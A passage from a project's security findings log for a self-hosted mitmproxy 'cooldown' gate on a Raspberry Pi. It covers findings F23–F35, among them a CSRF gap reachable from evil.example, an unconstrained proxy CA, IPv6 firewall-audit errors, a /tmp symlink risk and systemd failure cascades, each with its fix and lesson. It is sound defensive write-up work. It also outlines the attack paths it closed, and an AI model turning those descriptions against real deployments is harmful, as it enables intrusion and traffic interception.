was accurate when written. Nothing tied it to the rules it described, so it drifted into a
lie without anybody editing it.

---

## F23 — mDNS listening on a globally routable address, outside the firewall  ·  LOW  ·  FIXED

**What it is.** `avahi-daemon` listened on UDP 5353 on every interface. `eth0` holds
globally routable IPv6 addresses from the ISP, so "LAN-only" was never the right model for
this box. The firewall is an allowlist of a few **TCP** ports over a default-ACCEPT policy,
so a UDP listener was not covered by it at all.

**How it bit us.** Reachable on the public address from another host. Whether it was
reachable from the internet depends on the router's inbound IPv6 policy, which is untested
and cannot be determined from inside the network — so the honest ceiling on this finding is
"exposed to at least the local network, and possibly further".

**The fix.** Service and socket disabled and masked — the socket too, or socket activation
restarts the daemon behind you. Disabled rather than purged, since `libnss-mdns` and
`rpi-usb-gadget` depend on the package. The box is reached by address over the tailnet, so
`.local` discovery bought nothing.

**The concept — an allowlist over a default-ACCEPT policy only protects what someone
remembered to name.** avahi was the instance; the policy is the class, and the next service
that starts listening is exposed by default too. Left open deliberately, recorded here so
it is a decision rather than an oversight.

---

## F24 — No logs survived a reboot, so "was anything compromised?" had no answer  ·  LOW  ·  FIXED

**What it is.** Raspberry Pi OS ships `Storage=volatile` for journald, to spare the SD card.
Nothing was retained across a restart.

**How it bit us.** After the eleven-day outage the obvious question was whether anything had
happened during it. There was no evidence either way — and worse, the first attempt to
answer it reported "zero failed authentication attempts" from a journal that had begun
twenty minutes earlier. **An empty result was read as a clean one**, which is the same
error class as the outage itself.

**The fix.** `Storage=persistent`, capped at 200 MB with a month of retention, because the
SD-wear concern that motivated the vendor default is real. Verified by forcing a flush and
confirming files actually landed on disk rather than trusting the setting.

**The concept — "no records exist" is not "nothing happened".** A check that cannot
distinguish those two states will always report the reassuring one.

---

## F25 — The CSRF check guarded one of the two doors  ·  HIGH  ·  FIXED

**What it is.** `addon.py` rejects cross-site requests to `/budget/*`, and that covered
every mutating endpoint for as long as every one of them was served through the proxy. F9's
third fix moved the dashboard — and `/boot-ack` with it — onto the box's own origin, which
the addon never sees. Flask serves those same routes there and read no request header at
all. Same endpoints, two entrances, one lock.

```
                      → /budget/enter   (gated origin, via addon)  → 403 ✓
  POST from evil.com
                      → /enter          (box origin, direct)       → 302, session created ✗
```

**How it bit us.** With `Origin: https://evil.example` and `Sec-Fetch-Site: cross-site`
sent straight at the box: `POST /enter` created a session, `GET /exit` ended one (so an
`<img src>` was enough), `POST /reflect` and `/worth` wrote to the behavioural log, and
`POST /boot-ack` cleared `unacked_boot` — **the reboot alarm that "Accepted by design"
names as the compensating control for CA theft by physical access.** Nothing else surfaces
that event: `boot_events` is written and trimmed and never read by anything, so clearing
the banner erases the only trace.

Driving `/heartbeat` the same way charged the pool at 1s per wall-clock second, so roughly
fifteen minutes of an unrelated tab being open reached 900/900 and a 60-minute cooldown
across every gated site. Write-only throughout — there is still no `Access-Control-Allow-Origin`
anywhere, so nothing could be *read*.

**Honest ceiling.** The dashboard is plain HTTP, and that constrains the attack more than
first assumed. On the Pi shape the origin is `http://100.x.y.z:5000`, which is not a
potentially-trustworthy origin, so an HTTPS page's *subresource* requests to it are blocked
as mixed content — which also blocks the obvious chain through a script on a gated site.
What survives is a top-level navigation (neither mixed content nor a Private Network Access
subresource) and any attacker page served over HTTP. That comfortably covers the one-shot
endpoints — `/boot-ack`, `/exit`, `/enter` — and makes the sustained `/heartbeat` drain much
harder from an HTTPS origin. In the Docker shape the origin is the fixed
`http://127.0.0.1:5000`, so no reconnaissance is needed at all. **This was not measured in a
browser**, and relying on the browser to supply the missing check is the thing
"never trust the client for a security decision" exists to forbid — so it is fixed
regardless of which of those conditions holds today.

**Why two reviews missed it.** Two clearances pointed the wrong way at once. F14's fix list
named `/boot-ack` as covered while F9, in the same file, said it had moved — and the code
followed F9. And every `Sec-Fetch` test in the suite reaches the app through
`addon.BudgetAddon().request()`, including `test_every_mutating_endpoint_rejects_cross_site`,
which was built as the *standing* version of the F3→F14 fix. **The mechanism written to stop
F3 recurring could not see the origin where F3 recurred.** It passed at full green
throughout.

**The fix.** The same control at the second door: a `before_request` hook in `app.py`.
Which routes it guards is derived from the app's own `url_map` — a rule declaring any method
beyond `GET`/`HEAD`/`OPTIONS` is state-changing, and then *every* one of its methods is
guarded, so a new POST route is covered by existing rather than by being remembered, and
`/exit` is guarded as a `GET` (letting the verb stand in for the effect is what F14 was).
`Origin` and `Sec-Fetch-Site` are both read because neither covers the other: a cross-site
`<img src>` GET carries no `Origin`, and a browser without Sec-Fetch carries only `Origin`.
A request carrying neither is allowed — that is what the proxy's own forwarded calls look
like (`addon._forwarded_headers` sends `Content-Type` and nothing else), so the two layers
stay independent rather than one silently depending on the other.

`tests/test_invariants.py` gains `box()` as the deliberate sibling of `probe()`, and the
mutating set is derived from `url_map` rather than from `STATE_CHANGING`. Each endpoint is
called same-origin *first* to prove it acts, because the first draft of that test passed for
`/heartbeat` — which answers 403 when there is no session, so an empty Redis made it look
defended while it was wide open. Mutation-tested four ways, each caught by a different case:
hook removed → 24 fail; keyed on the verb → 3 fail (`GET /exit` only); `Origin` alone → 8
fail; `Sec-Fetch-Site` alone → 8 fail.

**The concept — a control lives at a door, not at a route.** Every fix in this document was
written where the traffic happened to be at the time, and that is fine until the traffic
moves. When F9 relocated five endpoints it was reasoned about as a *read* boundary, and it
was a good one; nobody asked what else the old path had been doing for those endpoints on
the way past. Ask, of any control: *if this code were reached another way, would it still
run?* If the answer is no, the control belongs to the path, not to the thing you meant to
protect — and the standing test that proves it must exercise every path too, or it will keep
reporting green from the one door somebody remembered.

---

## F26 — The CA could vouch for the whole internet  ·  MEDIUM  ·  FIXED

**What it is.** mitmproxy generates its own CA on first start, and that CA is
unconstrained: it can issue a valid certificate for *any* hostname. The SD card is
unencrypted and that is accepted by design — but what a copy of the card buys was never
examined. It buys a trust anchor your devices honour for your bank, your email and
everything else, not just for the sites this box gates.

This is not a bug anyone introduced. It is the default, and the default was never
questioned because the finding it belongs to ("physical access to the box") had already
been filed under *accepted*, which is a good way to stop looking at something.

**The fix.** The CA now carries X.509 name constraints listing exactly the domains in
`gen_allow_hosts.py` — the same derivation `--allow-hosts` is built from, so the two
cannot drift. A stolen key is now a trust anchor for Reddit and the news list. Measured,
against the generated CA rather than by reading the extension back out:

```
                         unconstrained CA      constrained CA
  www.reddit.com         vouches ✓             vouches ✓        (gated — must work)
  mybank.example         vouches ✗             REFUSED ✓
  accounts.google.com    vouches ✗             REFUSED ✓
  evil-reddit.com        vouches ✗             REFUSED ✓        (F4's shape)
  reddit.com.attacker.io vouches ✗             REFUSED ✓        (F4's shape)
```

Two details are load-bearing. A DNS constraint matches the name *and* any subdomain
(RFC 5280 4.2.1.10), which is exactly `host_matches()` semantics — hence the two F4 rows
above falling out for free. And a name **type** absent from the permitted subtrees is
unconstrained rather than forbidden, so permitting only DNS would have left a stolen CA
free to issue for IP addresses; IP, email and URI are explicitly excluded.

`deploy/gen_ca.sh` verifies its own output before installing it — signs one in-scope and
one out-of-scope host and refuses to write anything if the out-of-scope one validates.
A generator that silently stopped constraining would otherwise look identical from
outside.

**What it does not do.** It does not stop the key being copied, and it does not help for
the gated sites themselves — whoever holds it can still impersonate Reddit to you.
Enforcement of name constraints on a *user-installed* root is honoured by Firefox and by
Apple platforms; Android's support has historically been patchy, so this reduces blast
radius on the platforms that check rather than guaranteeing it everywhere.

**The cost, taken deliberately.** Adding a gated site now means regenerating the CA and
re-trusting every device, where it used to be a proxy restart. The CA is a fourth place
that must agree about the site list, and the failure mode if you forget is quiet in the
wrong direction: the proxy intercepts a site it cannot produce a valid certificate for,
so that site breaks with a certificate warning and nothing explains why.

**The concept — ask what the accepted risk is actually worth.** "Whoever holds the card
holds the key" was documented, understood and correct, and it stopped the question one
step too early. The key being copyable was not the thing to attack; the *value* of the
copy was, and that turned out to be adjustable by one certificate extension. When a risk
is accepted, the useful follow-up is not "can we prevent it after all" but "how much is
it worth to them, and can that be made smaller".

---

## F27 — The audit judged IPv6 listeners using IPv4 rules  ·  MEDIUM  ·  FIXED

**What it is.** `cooldown-audit.sh` decided which listening ports were contained by the
firewall, and `/health` rendered that as a "firewalled" badge. It read `iptables` only —
zero calls to `ip6tables` — while the listener set it judged came from `ss -tlnH`, which
reports `[::]` binds. So `[::]:22`, `[::]:8080` and `[::]:8081` were cleared on evidence
from the other address family, on a box holding a globally routable IPv6 address with
mitmdump bound to `[::]`. Two further defects in the same parser:

- `grep -vE -- '-i (lo|tailscale0)'` was meant to skip rules scoped to a safe interface.
  It also discarded `! -i tailscale0 ... -j ACCEPT` — a rule accepting from *everywhere
  except* the tailnet. The most permissive shape in the chain was read as the safest.
- Only the multiport `--dports` form was matched, so a plain `--dport 8080 -j ACCEPT`
  opening the proxy on every interface was classified as contained.

**Why it survived.** The two families agreed for months, so the output was correct while
the reasoning was not. It stopped being latent quietly: the v6 chain had drifted to seven
ACCEPT rules against v4's five, because the teardown deleted rules matching the *current*
port list and orphaned every previous generation.

**The fix.** Both families parsed, per-listener, with the harsher verdict winning — a port
exposed on either family is exposed. Negated interface matches kept. Both `--dport` forms
read. The teardown now deletes by rule *shape* rather than by today's port list. Verified
against stub rule sets, and the same cases run against the old parser fail exactly the two
it was blind to.

**The concept — a check that reads the wrong half of the evidence is worse than no check,
because it produces a badge.** `/health` was not silent about the firewall; it was
confident. F22 was the same shape (SSH open while the dashboard called it firewalled), and
the repair for F22 did not generalise to the address family nobody was looking at.

---

## F28 — The firewall could lock you out of your own box  ·  MEDIUM  ·  FIXED

**What it is.** `cooldown-redirect.sh` ended its setup with an unconditional
`iptables -P INPUT DROP`. Every ACCEPT above it used the pattern `-C ... || -I ...`, whose
failure is silent, and the file has no `set -e`. If any insertion failed — a conntrack
module that will not load is the realistic case — the accepts were missing and the policy
flipped anyway. Since port 22 was added to the tailnet-only allowlist, the LAN SSH fallback
is deliberately gone, so the recovery path is a monitor and a keyboard.

**The fix.** Before the flip, the three rules that keep the box reachable — established
connections, loopback, and the tailnet interface — are verified **present** with `-C`,
which asks the kernel what is actually in the chain rather than trusting the exit status of
the command that tried to add it. If any is missing, the policy stays at ACCEPT, loudly,
and the function returns non-zero.

**The concept — when a safety check fails, fail toward the recoverable state.** An exposed
box can be fixed from anywhere; a locked one cannot be fixed at all. The instinct to
"fail closed" is right for a door and wrong for the lock you are standing outside of.

Landed with someone physically at the box, behind a ten-minute automatic rollback to
ACCEPT that was confirmed armed before the change rather than assumed. It was not needed.

---

## F29 — A failed `apt` reported as "up to date"  ·  MEDIUM  ·  FIXED

**What it is.** The updates watchdog ran `apt-get -s dist-upgrade 2>/dev/null || true` and
counted `^Inst ` lines. Any apt failure — broken sources, unreachable repository, a wedged
dpkg — produced an empty simulation, which counted as zero pending, which `/health`
rendered as **"Up to date."** Demonstrated with a stub apt exiting 100: the state file
recorded `pending: 0, security: 0`.

**The fix.** The exit status is captured and published as `apt_ok`. When it is false the
reader returns `None` rather than `0`, and the page says the count is unknown. Two tests,
in both directions, so the fix cannot be satisfied by never saying "up to date" again.

**The concept — this is the project's oldest mistake, found in the one script whose entire
job is to prevent it.** F21 was eleven days of missed patches that nothing reported,
because silence read as success. The watchdog written in response to F21 contained the
same defect on its own reporting path. Absence of signal is not a good signal, and the
place it hides best is inside the thing you built to detect it.

Also fixed there: the error capture wrote to a fixed `/tmp` path as root, which a
pre-created symlink turns into root truncating an arbitrary file.

---

## F30 — The CA had no theft detection and no revocation path  ·  MEDIUM  ·  FIXED

**What it is.** Two halves of one gap in the trust anchor's lifecycle.

*Nothing noticed a read.* The audit pins the CA's fingerprint hourly, which detects
**modification** — but a thief copies the key and changes nothing, so the fingerprint check
stays green straight through a theft. The one event that matters most produced no signal at
all.

*Nothing knew what trusted it.* `rotate-ca.sh` has always said "every routed device must
install the new certificate", but nothing recorded which devices those were, and there is
no CRL or OCSP for a privately-trusted root — nothing phones home to ask whether it is
still valid. Revocation therefore means removing it from every trust store by hand, which
makes it exactly as complete as the inventory is. There was no inventory. Combined with
F26, which makes rotation *mandatory* for adding a gated site, that meant a rotation nobody
could finish, and so a site nobody could add.

**The fix.** `cooldown-cawatch` watches the CA directory and alerts off-box the moment the
private half is opened outside the proxy's own startup — the baseline is nearly empty
because mitmproxy loads the CA once and holds no descriptor afterwards, so a read at any
other time has no innocent explanation. `tools/ca-trust-scan.sh` inventories every trust
store on a machine and flags CA material that is not the expected one;
[CA-TRUST.md](CA-TRUST.md) holds the per-platform removal runbook.

What the first inventory found is the point: on one laptop the CA was trusted in **five**
places — the system bundle plus three Firefox profiles, one of them holding it twice —
because Firefox ignores the system store entirely. A rotation that updated "the laptop"
would have updated one of them. The scan also turned up a **second CA, with its private
key**, in `~/.mitmproxy/`, left behind by a superseded dev setup and trusted by nothing.

**The limits, stated because a detector believed to be complete is worse than none.**
inotify reports *that* a file was read, never *who* read it — the events carry no process
identity. Copying the SD card while the box is off produces no event. Root can stop the
service. This raises the cost of a quiet theft; it does not prevent one.

---

## F31 — The dependency tree had never been reviewed  ·  MEDIUM  ·  FIXED

**What it is.** `requirements.txt` pinned `requests==2.31.0` from 2023 and nothing had ever
checked what the tree was carrying. Three security reviews read this code; none asked.

**What the check found, and why the ranking matters.** `tools/check-deps.py` queries OSV
for the versions actually installed. Sorting by severity would have got the priorities
backwards:

- `tornado` carried **eight** advisories and is never imported — mitmdump does not load it;
  it is there for mitmweb, which this deployment never runs.
- Every application-level advisory was unreachable, verified rather than assumed: no
  `verify=False` outside tests, no `~/.netrc`, `extract_zipped_paths` never called, no
  Flask sessions, no proxy authentication.
- What *was* reachable sat in the TLS path: the `cryptography` wheel bundled a statically
  linked OpenSSL vulnerable to a heap use-after-free, and `pyOpenSSL` carried a TLS bypass
  in the `set_tlsext_servername` callback — the exact path used to mint a certificate per
  hostname.

**The fix.** Upgraded, with the floors recorded in `requirements.txt` so a fresh install
cannot regress. One advisory is left deliberately unfixed and written down: mitmproxy pins
`h2==4.3.0` exactly, so a request-smuggling fix in 4.4.1 cannot be taken until upstream
moves.

**The concept — reachability beats severity, and "not applicable" has to be evidence.**
Every entry in the reviewed list names the check that established it, because such a claim
goes stale the moment the code grows the thing it says is absent.

---

## F32 — Controls that could not fail  ·  LOW  ·  FIXED

**What it is.** Three separate mechanisms that reported success without checking anything.

- **Ten tests could pass vacuously.** Each asserted only inside a loop over a collection
  derived from the code under test, so an empty collection meant zero assertions and a
  green test. Proven, not inferred: with `THEMES = {}` two theme tests passed. The suite
  had never been audited for the shape, despite the same defect being hit three times in
  one session.
- **Five entries in the repo-parity allowlist matched nothing.** Each exempted a difference
  that a later rename rule had absorbed. The test guarding the allowlist checked an
  entry's *shape* — file, needle length, reason present — and never whether it still
  described a real difference, despite its own docstring saying an entry matching nothing
  is stale.
- **The dependency review list had the same defect within hours of being written**, when
  the upgrade it motivated made five of its seven entries obsolete.

**The fix.** `tools/audit-tests.py` finds the vacuous shape statically and knows which
iterables cannot be empty; each exemption list now fails when an entry stops matching.

**The concept — an exemption is a standing permission, and one that no longer permits
anything is indistinguishable from one that quietly permits everything.** The parity
allowlist is the only control between the private repo and the public one, and the same
evening these were found, five private identifiers were sitting in the public repo. One
was not cosmetic: a systemd unit there pointed at a script path the public installer never
creates, so a public installation's weekly audit would have silently never run.

Three of the ten vacuous tests could not be fixed with a non-empty guard, and that turned
out to be the more useful finding. They are parametrised over hostile paths where
forwarding *nothing* is the correct behaviour, so asserting the collection is non-empty is
simply wrong — applying the mechanical fix broke 42 cases. They are covered instead by one
test that the harness forwards anything at all, which is the real hole: if forwarding
broke, every case would iterate an empty list and the whole set would go green.

---

## F33 — Stopping Redis stopped the gate, and nothing started it again  ·  MEDIUM  ·  FIXED

**What it is.** `cooldown-app.service` declared `Requires=redis-server.service`, and
`cooldown-proxy.service` declared `Requires=cooldown-app.service`. `Requires=` propagates a
*stop*: taking Redis down took both of them down behind it. `Restart=always` did not fire —
systemd does not restart a unit it deliberately stopped — and starting Redis again does not
run the dependency in reverse. The box was left with no proxy at all.

That is worse than it first sounds when the box is a Tailscale exit node. A dead proxy is
not "Reddit is ungated"; it is the phone having no internet, until a human notices and runs
`systemctl start` by hand.

**Found by accident, which is the honest version.** It surfaced while testing something
else — a review had predicted that a dead Redis would let the proxy forward gated traffic
unchecked, and the command to test that was `systemctl stop redis-server`. The prediction
was wrong. The cascade was not, and it had been shipped for months.

**The distinction that matters, and that nobody had tested.** Measured, both directions:

| Action | Dependents | Recovered? |
|---|---|---|
| `systemctl restart redis-server` | cycled with it | yes, automatically |
| `systemctl stop`, crash, OOM | stopped | **no — stayed down** |

So the nightly `apt` run, the scenario that first looked alarming, was always safe. The
dangerous case was the one no schedule produces and no test covered: Redis dying on its own.

**The fix.** `Requires=` → `Wants=` on both, keeping `After=`. Ordering is preserved,
propagation is dropped, and `Restart=always` still covers a genuine crash. Verified by
re-running the exact command that caused the outage: Redis goes inactive, both units stay
active, and everything is healthy again the moment Redis returns.

Failing closed never required the process to die. With Flask gone the addon's loopback
fetch raises and the handler already serves "Budget server unreachable" on navigations and
503 on sub-requests — gated sites stay shut while the rest of the network keeps working.

**The concept — a dependency declaration is a failure-propagation policy, and it is
usually written as if it were a startup-ordering one.** `After=` says *when*. `Requires=`
says *my fate is yours*. The unit file already made that distinction correctly one line
above, for `tailscaled`: "this ordering is an optimisation, not a dependency." The same
sentence was true of Redis and nobody wrote it there. The test that would have caught this
is not a clever one — stop each dependency in turn and see what is still running.

---

## F34 — Two deployments hardened separately, one of them never  ·  MEDIUM  ·  FIXED

**What it is.** Redis AOF persistence was off on the native deployment. Without it an
unclean stop loses every write since the last RDB snapshot — up to an hour under the
default save policy, and that is your spent time, your cooldowns and your history.

**Why it survived.** This project ships two deployment shapes, and they were hardened at
different times by different routes. `docker-compose.yml` sets `--appendonly yes
--appendfsync everysec` on the Redis service and always has. `install.sh` started
`redis-server` from the distro package and never touched persistence, and Debian ships
`appendonly no`. Both were "done"; only one was ever checked, and the record of the work
did not distinguish them.

There is also a `redis.conf` in the repo that promises AOF — and nothing installs it. The
compose path sets the flags directly rather than mounting it, and the native path does not
read it at all. `grep -rn redis.conf` finds no consumer. An artifact that documents an
intention nobody executes reads exactly like a configuration that is in force.

**The fix.** `install.sh` now enables AOF and persists it with `CONFIG REWRITE`, and the
hourly audit checks it. The check asks the *running server*, not the config file, because
those are different claims: `appendonly yes` on disk proves somebody typed it, while
`aof_enabled` proves it is in force — and a package upgrade rewriting the config leaves the
first true and the second false. Mutation-tested by turning AOF off at runtime and
confirming the check fires.

**The concept — "we hardened it" is a claim about a machine, not about a project.** Where
two deployment shapes exist, every hardening step has to be answered twice, and a checklist
that does not name which target it was done against will be read as covering both. The same
question applies to every other control here: the firewall, the journal, the service
accounts. Each is answered by one installer and should be verified on whichever one you
actually run.

---

## F35 — The audit crashed on the SSH key count, hourly, and published the wrong number  ·  LOW  ·  FIXED

**What it is.** The line tallying authorized SSH keys was

    key_count=$((key_count + $(grep -c '^ssh-...' "$f" 2>/dev/null || echo 0)))

`grep -c` prints `0` when it matches nothing **and exits 1 while doing it**. So the `||`
fallback fired on top of the zero grep had already printed, the substitution expanded to
two lines, and `$(( ))` aborted with *"syntax error in expression"*. Every hour, in the
journal, since the check was written. The arithmetic died, `key_count` kept its previous
value, and the number published to the dashboard undercounted — a single key file with no
keys in it was enough to corrupt the whole tally.

**Why it matters more than an off-by-one.** The reason this count exists is to notice an
SSH key you did not put there. It was reporting a number derived from a crashed
calculation, and reporting it as data.

**The concept — a fallback is only as good as your reading of the failure it catches.**
`grep -c`'s non-zero exit means *found nothing*, not *could not count*, and "found nothing"
is a successful count of zero. This project has now made the same mistake three times in
different clothes (`grep | head || echo`, twice, where the pipeline's status comes from
`head` and the fallback can never fire). The rule that generalises: before writing `||`,
say what the left side's failure status actually reports. If it reports a *result* rather
than an *error*, the fallback is not a safety net — it is a second, conflicting answer.

Caught by reading the journal after deploying an unrelated change to the same script, which
is the only reason anyone saw it: nothing tests this script, and its own output looked
plausible.

---

## Accepted by design

Some risks are the cost of what the tool *is* — understood, bounded, documented,
not eliminated. Naming them is itself good practice.

- **Physical access to the box.** The SD card is unencrypted, so whoever holds the
  hardware holds the CA. Full-disk encryption on a headless always-on machine is theatre —
  the key must be readable at boot regardless. The answer is *revocation, not encryption*:
  untrusting the certificate on your devices makes a stolen key inert in about two minutes,
  even against root. Hence `RECOVERY.md`, `rotate-ca.sh`, and a reboot alarm that turns a
  quiet card-copy into a visible event.
- **A weakened CSP on gated sites.** Now minimal rather than total — one nonce added,
  everything else enforced (F8) — but our script does run on those origins by design.
- **The CA key is a single trust anchor.** Whoever holds it can decrypt your
  traffic *for the gated sites*. It stays on the box, out of git; the mitigation is
  guarding the box, not removing the trust. **Bounded since F26**: the CA carries name
  constraints, so a stolen key is a trust anchor for Reddit and the news list rather than
  for your bank — on the platforms that enforce them, which is not all of them.
- **The VPN-off bypass.** Turning the tunnel off routes around the gate —
  deliberate *soft* friction (a commitment device for a cooperative user), not an
  adversarial lock.
- **Security leans on the firewall.** mitmproxy accepts any source
  (`block_global=false`), so F1's firewall is what contains it. A noted dependency.
- **Dependency ranges instead of pins.** `mitmproxy` and `flask` are ranges so the project
  installs on both current Raspberry Pi OS releases. That is a deliberate trade of a
  slightly wider supply-chain surface for not locking out most users.

---

## What to carry forward

- **Never trust the client for a security decision.** Validate where you control it
  — the box, not the browser. (Same reason changing your phone's clock can't skip
  the cooldown: the Pi is the authority.)
- **Defense in depth.** WireGuard *and* TLS; firewall *and* bind rules; filter *and*
  mangle QUIC blocks. Each layer backstops the next.
- **Minimize and default-deny.** Narrowest interface, tightest allow-list,
  drop-by-default. Every open port/wildcard/"contains" is surface you didn't need.
- **Mind the parser gap.** When two components read input differently, the
  disagreement is the bug. Validate strictly; rebuild from trusted parts.
- **Name your trust anchors and your accepted risks.** Know the one thing whose
  compromise unravels everything (the CA key / the box), protect it hardest, and
  write down what you chose *not* to fix and why.
- **Review the deployment, not just the design.** F1–F5 came from reading the code.
  F6–F12 came from logging into the running box — and included the two most serious
  findings. A threat model is a hypothesis; the machine is the evidence.
- **Audit the scripts around the app, not just the app.** F16–F18 were in a dev launcher,
  a deploy script and an exemption list — none of them "the code", all of them able to
  undo it. The installer, the helper script and the README are part of the attack surface
  because they decide what actually runs.
- **Verify the boundary, don't assert it.** Every fix here was checked against the thing
  itself: a new SSH connection before trusting the old one, a live fetch returning 403, a
  mutation test proving a new test actually fails when the protection is removed. A test
  that cannot fail is decoration.
- **Turn each fixed class into something that fails automatically.** The findings that
  repeated (F4→F18, F3→F14, F1/F5→F16) all repeated because the fix was a one-time edit
  with nothing standing behind it. `tests/test_invariants.py` and `.githooks/pre-commit`
  are the standing version: the tests assert *properties* derived from the code (every
  route classified, every reachable mutating endpoint CSRF-checked *at both origins*, no
  path escaping the
  loopback call), and the hook greps added lines for the exact shapes above. Both were
  mutation-tested — each was shown to fail when the bug it targets is reintroduced,
  because a check that cannot fail is decoration.
- **Test the assumption, not just the attack.** F9's first fix passed every test written
  for it, because those tests were the attack that prompted it. What was never checked was
  the sentence the fix rested on — *"a script cannot reach these pages"* — which was true of
  three pages and false of the fourth. Write down what a control assumes, then attack the
  assumption.
- **Re-read code that has already been reviewed.** F13–F15 were in files two prior passes
  had gone through line by line, and F13 was a HIGH sitting in plain sight. A review that
  starts from "this part was cleared" inherits the last reviewer's blind spots along with
  their conclusions; the cheapest way to break that is a pass that hasn't read them.
